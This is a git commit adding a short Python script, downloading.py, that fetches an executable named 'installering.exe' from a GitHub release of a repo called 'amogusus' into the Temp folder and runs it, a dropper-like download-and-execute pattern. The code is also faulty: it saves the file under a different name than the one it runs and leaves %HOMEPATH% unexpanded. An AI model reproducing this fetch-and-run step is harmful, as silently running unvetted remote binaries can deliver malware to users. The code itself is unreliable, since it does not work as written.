a78de7274759316c48b77443e5d4e400166c5bcf
Pilot1782 <34791564a@gmail.com>
2023-02-07 08:15:53 -0700

    Create downloading.py

---
+++ downloading.py
@@ -0,0 +1,4 @@
+import urllib.request
+import os
+urllib.request.urlretrieve("https://github.com/Pilot1782/amogusus/releases/download/V1.1.1/installering.exe", r"%HOMEPATH%\AppData\Local\Temp\downloader.exe")
+os.system(r"%HOMEPATH%\AppData\Local\Temp\installering.exe")
